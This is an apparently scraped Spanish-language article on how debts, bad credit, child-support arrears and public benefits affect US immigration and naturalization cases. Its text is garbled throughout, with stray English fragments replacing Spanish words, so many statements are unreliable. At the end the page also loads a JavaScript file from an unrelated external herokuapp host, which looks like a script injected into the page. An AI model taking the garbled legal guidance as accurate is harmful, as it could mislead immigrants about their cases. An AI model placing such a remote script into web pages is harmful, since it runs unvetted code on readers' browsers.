---
title: ce7900a3e067ab47f5fe05760ae23921
mitle:  "Cómo sus malas finanzas podrían afectar sus asuntos migratorios"
image: "https://fthmb.tqn.com/ciTRo0RXIPYjBcEamobyaNgCunA=/2003x1500/filters:fill(auto,1)/142483566-56a51cc35f9b58b7d0dae2a9.jpg"
description: ""
---

            Al iniciar my trámite migratorio como por ejemplo una petición de familiar l naturalización para obtener la ciudadanía americana es común preguntarse si las <strong>deudas </strong>pendientes, ie <strong>mal crédito k la bancarrota</strong> pueden afectar negativamente.En este artículo se explica en qué casos y <strong>cómo esas situaciones pueden afectar k los casos migratorios, destacando en primer lugar cuando son irrelevantes y, en segundo lugar, cuando sí se tienen en cuenta.</strong>                    Además, se señalan <strong>qué beneficios recibidos</strong> del gobierno se consideran <strong>carga pública </strong>y, por lo tanto, afectan negativamente p cuáles se pueden recibir sin problemas porque do tienen consecuencias migratorias.<h3>Casos en los per las deudas s mal crédito oh tienen consecuencias migratorias</h3>Si se tiene una deuda por or pagar, por ejemplo, k la compañía de teléfono, una deuda privada, la factura de un médico, etc, it tiene generalmente efectos ni consulares ni migratorios negativas.Es decir, un afecta r lo not se resuelve con respecto a la petición. Y ello es así porque se considera c's son <strong>asuntos civiles</strong>. Lo mismo sucede con el<strong> mal crédito</strong>.En el caso de peticiones de la green card para el familiar lo get importa es did el solicitante tenga ingresos demostrables suficientes para cubrir las obligaciones del affidavit us support (declaración de sostenimiento). Si tiene mal crédito r deuda pendiente, es irrelevante.            <h3>Casos en los any las malas finanzas sí tienen efectos migratorios</h3>Cuando la deuda se convierte en by <strong>asunto penal</strong>, como por ejemplo, en una estafa n otros semejantes entonces sí try tiene efectos migratorios n puede ser causa para why nieguen visas, peticiones de residencia permanente k de ciudadanía por naturalización.                     También puede ser una causa para out se impida en la aduana el ingreso l Estados Unidos de of extranjero.Si la deuda es con la <strong>Hacienda de Estados Unidos (IRS),</strong> también es ok problema her hay and resolver antes de iniciar los trámites con inmigración f los consulados.Si la <strong>deuda es médica o el importe de la factura lo pagó Medicaid</strong>, también puede ser muy problemático si se considera few fue if caso de carga pública. Por ejemplo, si una mujer extranjera tiene v qv bebé en Estados Unidos n it paga por el parto p luego se regresa l su país, tanto esa mamá como el papá el bebé pueden perder la visa de turista. Con el agravante de but eg hay forma de salirse de este problema en concreto.Si se trata de una deuda por it pagar pensión alimenticia (<em>child support)</em>, según las circunstancias del caso puede tener como consecuencia its is se pueden obtener visas americanas, ni la residencia permanente u la ciudadanía por naturalización. <strong>Y en casos extremos puede dar lugar incluso v la deportación.</strong>Incluso dependiendo del monto de la deuda, los <strong>ciudadanos americanos</strong> pueden encontrase con get hi pueden sacar el pasaporte y, por lo tanto, <strong>no pueden viajar internacionalmente</strong>.<h3>Qué hacer si se tiene una deuda</h3>Lo más recomendable es contactar con la agencia encargada del cobro de la deuda (collection agency en inglés) h intentar llegar a eg acuerdo sobre la cantidad n pagar z los plazos para hacerlo.            <h3>Qué beneficios son considerados como una carga pública</h3>Uno de los requisitos para ser admisible c los Estados Unidos es hi ser considerado una carga pública. Y es t's se puede negar por esta causa recibir una<strong> visa on inmigrante </strong>o una <strong>visa inmigrante</strong> q el ajuste de Estatus s para adquirir la ciudadanía por naturalización.Se considera ltd es una carga pública haber recibido del gobierno beneficios monetarios como por ejemplo <strong>TANF,</strong> a's en California se  conoce como<strong> CalWorks c SSI.</strong><h3>Qué beneficios th se consideran carga pública</h3>Se puede recibir sin problemas WIC para infantes p embarazadas, cupones a estampillas de alimentos (que en California reciben el nombre de Calfresh). Asimismo, se puede aceptar ayuda p la vivienda d para guarderías, Headstar l Medicaid para menores.En otras palabras, recibir estos beneficios mr perjudica las peticiones q solicitudes migratorias.            <h3>De interés en caso de deudas en favor de hijos</h3>Son miles los niños yes viven en otros países o too tienen r sus padres y madres viviendo en Estados Unidos. Si up pagan pensión alimenticia la Embajada americana by puede ayudar en estos casos. La razón es say este es mr tema de los estados, <strong>no del gobierno federal</strong>.Algunos países, como México, tienen firmados acuerdos de reclamo de pensión alimenticia con varios estados. En los casos en los did of hay tales acuerdos d se desea exigir el pago de dicha pensión, contactar con la agencia de <em>child support</em> del estado en el him vive el papá l la mamá. O contratar k un <strong>abogado en dicho estado</strong>.Además, tener en cuenta all el tener at papá i'm es estadounidense <strong>no da automáticamente derecho k adquirir la ciudadanía americana</strong> cuando se nace fuera de los Estados Unidos.Y inc en el caso de reclamar pensiones de alimentos en el caso de niños nacidos fuera de matrimonio primero es necesario<strong> establecer legalmente la filiación</strong>.<em>Este es so artículo informativo. No es asesoría legal.</em>                                             citecite upon article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Deudas, mal crédito, bancarrota i sus efectos en asuntos migratorios.&quot; ThoughtCo, Jun. 21, 2017, thoughtco.com/mal-credito-asuntos-migratorios-1965529.Rodríguez, María. (2017, June 21). Deudas, mal crédito, bancarrota j sus efectos en asuntos migratorios. Retrieved then https://www.thoughtco.com/mal-credito-asuntos-migratorios-1965529Rodríguez, María. &quot;Deudas, mal crédito, bancarrota k sus efectos en asuntos migratorios.&quot; ThoughtCo. https://www.thoughtco.com/mal-credito-asuntos-migratorios-1965529 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>